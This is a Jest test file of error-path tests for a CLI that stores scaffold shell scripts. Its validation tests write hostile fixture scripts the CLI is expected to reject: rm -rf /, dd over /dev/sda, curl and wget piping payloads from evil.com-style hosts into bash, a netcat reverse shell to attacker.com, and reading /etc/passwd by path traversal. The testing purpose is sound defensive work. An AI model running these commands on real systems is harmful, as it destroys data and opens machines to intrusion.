/**
 * Unhappy Path Tests for Scaffold Scripts CLI
 * Tests error conditions, validation failures, and edge cases
 */

import { execSync } from 'child_process';
import { existsSync, mkdirSync, rmSync, writeFileSync } from 'fs';
import { join } from 'path';

// Test setup
const TEST_DB_PATH = join(__dirname, 'test-data', 'unhappy-path.db');
const TEST_SCRIPTS_DIR = join(__dirname, 'test-scripts-unhappy');
const CLI_PATH = join(__dirname, '..', 'dist', 'index.js');

beforeAll(() => {
  // Create test directories
  mkdirSync(join(__dirname, 'test-data'), { recursive: true });
  mkdirSync(TEST_SCRIPTS_DIR, { recursive: true });
  
  // Set test database
  process.env.SCAFFOLD_DB_PATH = TEST_DB_PATH;
});

afterAll(() => {
  // Cleanup
  if (existsSync(join(__dirname, 'test-data'))) {
    rmSync(join(__dirname, 'test-data'), { recursive: true });
  }
  if (existsSync(TEST_SCRIPTS_DIR)) {
    rmSync(TEST_SCRIPTS_DIR, { recursive: true });
  }
});

describe('Unhappy Path Tests', () => {
  
  describe('Validation Failures', () => {
    test('should reject script with dangerous commands', () => {
      const dangerousScript = `#!/bin/bash
rm -rf /
sudo rm -rf /home/user
del /s /q C:\\\\*
format C:
dd if=/dev/zero of=/dev/sda`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'dangerous.sh');
      writeFileSync(scriptPath, dangerousScript);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend dangerous ${scriptPath} --strict`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should reject script with unbalanced quotes', () => {
      const badQuotesScript = `#!/bin/bash
echo "Hello world
echo 'Missing quote
echo "Another missing quote'`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'bad-quotes.sh');
      writeFileSync(scriptPath, badQuotesScript);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend bad-quotes ${scriptPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should reject script with suspicious network commands', () => {
      const networkScript = `#!/bin/bash
curl -fsSL http://malicious-site.com/script.sh | bash
wget -O - http://evil.com/payload | sh
nc -e /bin/bash attacker.com 4444`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'network-danger.sh');
      writeFileSync(scriptPath, networkScript);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add backend network-danger ${scriptPath} --strict`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should reject script with path traversal attempts', () => {
      const traversalScript = `#!/bin/bash
cd ../../../etc
cat ../../../etc/passwd
rm -f ../../../../important-file.txt`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'traversal.sh');
      writeFileSync(scriptPath, traversalScript);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add init traversal ${scriptPath} --strict`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should reject empty or whitespace-only script', () => {
      const emptyScript = `   
      
      
      `;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'empty.sh');
      writeFileSync(scriptPath, emptyScript);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend empty ${scriptPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('File System Errors', () => {
    test('should handle non-existent script file', () => {
      const nonExistentPath = join(TEST_SCRIPTS_DIR, 'does-not-exist.sh');
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend non-existent ${nonExistentPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle script file with no read permissions', () => {
      const scriptContent = `echo "test"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'no-read.sh');
      writeFileSync(scriptPath, scriptContent);
      
      // Remove read permissions (Unix only)
      try {
        execSync(`chmod 000 ${scriptPath}`);
        
        expect(() => {
          execSync(`node ${CLI_PATH} add frontend no-read ${scriptPath}`, 
            { encoding: 'utf8', stdio: 'pipe' });
        }).toThrow();
      } catch (e) {
        // Skip on Windows or if chmod fails
        console.log('Skipping permission test on this platform');
      }
    });

    test('should handle binary file instead of script', () => {
      const binaryData = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); // PNG header
      const binaryPath = join(TEST_SCRIPTS_DIR, 'binary.png');
      writeFileSync(binaryPath, binaryData);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend binary ${binaryPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('Command Not Found Errors', () => {
    test('should handle request for non-existent frontend command', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} -f non-existent-framework`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle request for non-existent backend command', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} -b non-existent-backend`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle request for non-existent init command', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} -i non-existent-init`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle update of non-existent command', () => {
      const scriptContent = `echo "test"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'update-test.sh');
      writeFileSync(scriptPath, scriptContent);
      
      expect(() => {
        execSync(`node ${CLI_PATH} update frontend non-existent ${scriptPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle removal of non-existent command', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} remove frontend non-existent`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('Invalid CLI Arguments', () => {
    test('should handle invalid command type', () => {
      const scriptContent = `echo "test"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'invalid-type.sh');
      writeFileSync(scriptPath, scriptContent);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add invalid-type test ${scriptPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle missing required arguments', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle missing script path', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend test`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle invalid platform option', () => {
      const scriptContent = `echo "test"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'platform-test.sh');
      writeFileSync(scriptPath, scriptContent);
      
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend test ${scriptPath} -p invalid-platform`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle conflicting options', () => {
      expect(() => {
        execSync(`node ${CLI_PATH} -f react -b dotnet`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('Database Errors', () => {
    test('should handle duplicate command addition', () => {
      const scriptContent = `echo "first script"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'duplicate.sh');
      writeFileSync(scriptPath, scriptContent);
      
      // Add first command
      execSync(`node ${CLI_PATH} add frontend duplicate ${scriptPath}`, 
        { encoding: 'utf8' });
      
      // Try to add duplicate - should fail
      expect(() => {
        execSync(`node ${CLI_PATH} add frontend duplicate ${scriptPath}`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle database corruption gracefully', () => {
      // Write invalid data to database file
      writeFileSync(TEST_DB_PATH, 'invalid database content');
      
      expect(() => {
        execSync(`node ${CLI_PATH} list`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('Script Execution Errors', () => {
    test('should handle script with syntax errors', () => {
      const syntaxErrorScript = `#!/bin/bash
echo "Missing quote
if [ missing bracket
for i in missing do
invalid syntax here !@#$%^&*()`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'syntax-error.sh');
      writeFileSync(scriptPath, syntaxErrorScript);
      
      // Should add with warnings but not execute successfully
      const output = execSync(`node ${CLI_PATH} add frontend syntax-error ${scriptPath} --no-validate`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
      
      // Execution should fail
      expect(() => {
        execSync(`node ${CLI_PATH} -f syntax-error`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });

    test('should handle script that tries to access non-existent directories', () => {
      const badPathScript = `#!/bin/bash
cd /non/existent/directory
ls -la /another/fake/path
mkdir /root/unauthorized`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'bad-paths.sh');
      writeFileSync(scriptPath, badPathScript);
      
      const output = execSync(`node ${CLI_PATH} add init bad-paths ${scriptPath} --no-validate`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added init command');
      
      // Should execute but commands will fail
      expect(() => {
        execSync(`node ${CLI_PATH} -i bad-paths`, 
          { encoding: 'utf8', stdio: 'pipe' });
      }).toThrow();
    });
  });

  describe('Cross-Platform Conversion Errors', () => {
    test('should handle complex shell features that cannot be converted', () => {
      const complexScript = `#!/bin/bash
function complex_function() {
    local var=$1
    case $var in
        pattern1) echo "match1" ;;
        pattern2|pattern3) 
            echo "match2 or 3"
            ;;
        *) echo "default" ;;
    esac
}

# Process substitution
diff <(ls dir1) <(ls dir2)

# Advanced parameter expansion
echo \${var:-default}
echo \${var#prefix}
echo \${var%suffix}

# Here documents
cat << 'EOF'
Complex content
with variables $USER
EOF`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'complex-shell.sh');
      writeFileSync(scriptPath, complexScript);
      
      // Should add but show warnings about conversion limitations
      const output = execSync(`node ${CLI_PATH} add frontend complex-shell ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
      expect(output).toContain('Warnings');
    });

    test('should handle PowerShell-specific features that cannot be converted to shell', () => {
      const psScript = `# PowerShell specific features
$ErrorActionPreference = "Stop"

Get-WmiObject -Class Win32_ComputerSystem | Select-Object Name, Domain

$obj = New-Object PSObject -Property @{
    Name = "Test"
    Value = 42
}

$obj | Where-Object { $_.Value -gt 30 } | ForEach-Object {
    Write-Host "Processing $($_.Name)"
}

# Registry access
Get-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion"

# Windows-specific paths
$env:PROGRAMFILES
$env:WINDIR`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'complex-ps.ps1');
      writeFileSync(scriptPath, psScript);
      
      // Should add but show platform compatibility warnings
      const output = execSync(`node ${CLI_PATH} add backend complex-ps ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added backend command');
      expect(output).toContain('Platform Compatibility');
    });
  });

  describe('Resource Constraints', () => {
    test('should handle extremely large script files', () => {
      const largeContent = 'echo "Large script content"\\n'.repeat(10000);
      const scriptPath = join(TEST_SCRIPTS_DIR, 'large-script.sh');
      writeFileSync(scriptPath, largeContent);
      
      // Should handle large files but may show warnings
      const output = execSync(`node ${CLI_PATH} add init large-script ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added init command');
    });

    test('should handle script with very long lines', () => {
      const longLineScript = `#!/bin/bash
echo "${'a'.repeat(5000)}"
mkdir ${'path/'.repeat(100)}deep
export VERY_LONG_VAR="${'value'.repeat(1000)}"`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'long-lines.sh');
      writeFileSync(scriptPath, longLineScript);
      
      const output = execSync(`node ${CLI_PATH} add frontend long-lines ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
    });
  });

  describe('Edge Cases', () => {
    test('should handle scripts with unusual character encodings', () => {
      const unicodeScript = `#!/bin/bash
echo "Hello 世界 🌍"
mkdir "测试目录"
echo "Тест кириллица"
echo "العربية"`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'unicode.sh');
      writeFileSync(scriptPath, unicodeScript);
      
      const output = execSync(`node ${CLI_PATH} add init unicode ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added init command');
    });

    test('should handle scripts with mixed line endings', () => {
      const mixedLineEndingsScript = `#!/bin/bash\\r\\n` +
        `echo "Windows line ending"\\r\\n` +
        `echo "Unix line ending"\\n` +
        `echo "Mixed content"\\r\\n`;
      
      const scriptPath = join(TEST_SCRIPTS_DIR, 'mixed-endings.sh');
      writeFileSync(scriptPath, mixedLineEndingsScript);
      
      const output = execSync(`node ${CLI_PATH} add frontend mixed-endings ${scriptPath}`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
    });

    test('should handle empty alias and description', () => {
      const scriptContent = `echo "Simple script"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'no-metadata.sh');
      writeFileSync(scriptPath, scriptContent);
      
      const output = execSync(`node ${CLI_PATH} add frontend no-metadata ${scriptPath} -a "" -d ""`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
    });

    test('should handle special characters in alias and description', () => {
      const scriptContent = `echo "Special chars test"`;
      const scriptPath = join(TEST_SCRIPTS_DIR, 'special-chars.sh');
      writeFileSync(scriptPath, scriptContent);
      
      const output = execSync(`node ${CLI_PATH} add frontend special-chars ${scriptPath} -a "test!@#" -d "Description with $pecial ch@rs & symbols"`, 
        { encoding: 'utf8' });
      
      expect(output).toContain('Added frontend command');
    });
  });
});